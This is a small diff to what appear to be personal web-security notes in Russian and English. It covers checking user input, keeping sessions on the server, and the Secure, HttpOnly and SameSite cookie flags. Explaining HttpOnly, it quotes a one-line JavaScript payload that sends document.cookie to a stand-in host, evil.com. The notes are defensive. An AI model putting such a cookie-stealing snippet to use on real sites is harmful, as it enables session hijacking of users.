@@ -1,3 +1,9 @@
+```
+check any user input
+don't believe to any Framework
+не будь слишком самоуверенным
+```
+- Мораль. Сессию надо обязательно хранить на сервере. Либо всю, либо признак жива-мертва
 - set cookie `Secure` (protects from man in the middle)
 - `HttpOnly` недостуна из JavaScript. Защищает от атак `(new Image()).src = "http://evil.com/steal-cookie.php?cookie=" + document.cookie;`
 - `SameSite=Strict`, нельзя посылать между разными доменами
